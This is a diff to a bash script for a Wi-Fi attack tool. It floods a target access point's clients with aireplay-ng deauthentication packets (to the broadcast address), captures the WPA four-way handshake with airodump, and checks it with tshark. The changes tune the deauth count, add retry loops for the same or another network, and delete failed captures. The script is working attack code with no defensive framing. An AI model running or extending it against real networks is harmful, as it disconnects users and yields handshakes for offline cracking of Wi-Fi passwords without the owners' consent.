@@ -137,7 +137,7 @@ function handshake(){
     airodump_filter_xterm_pid=$!
 
     sleep 5; echo -e "${yellow}[*]${nc} Deauthenticating all clients..."
-    xterm -hold -e "aireplay-ng -0 15 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
+    xterm -hold -e "aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
     aireplay_xterm_pid=$!
 
     sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null
@@ -146,7 +146,7 @@ function handshake(){
 
     sleep 60 # Listen for 60 seconds
 
-    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" > handshake.txt
+    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
 
     if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
         echo -e "${green}[+]${nc} Handshake captured"
@@ -154,19 +154,29 @@ function handshake(){
     else
         echo -e "${red}[-]${nc} Handshake could not be captured"
         echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
-        tshark -r capture_${ap_bssid}-01.cap -Y "eapol" > handshake.txt
+        tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
         if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
             echo -e "${green}[+]${nc} Handshake captured"
         else
             echo -e "${red}[-]${nc} Handshake could not be captured"
         fi
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
-        echo -ne "${yellow}[?]${nc} Do you want to try again? [y/n]: " && read answer
+        echo -ne "${purple}[?]${nc} Do you want to try again with the same network? [y/n]: " && read answer
         if [[ $answer == "y" ]]; then
+            echo -e "${red}[-]${nc} The failed captures will be deleted"
+            rm -rf capture_*
+            handshake
+        fi
+        echo -ne "${purple}[?]${nc} Do you want to try again with another network? [y/n]: " && read answer
+
+        if [[ $answer == "y" ]]; then
+            echo -e "${red}[-]${nc} The failed captures will be deleted"
+            rm -rf capture_*
+            select_target_network
             handshake
         fi
     fi
-
+    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
     if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
         mkdir -p handshakes
         mv capture_* handshakes/
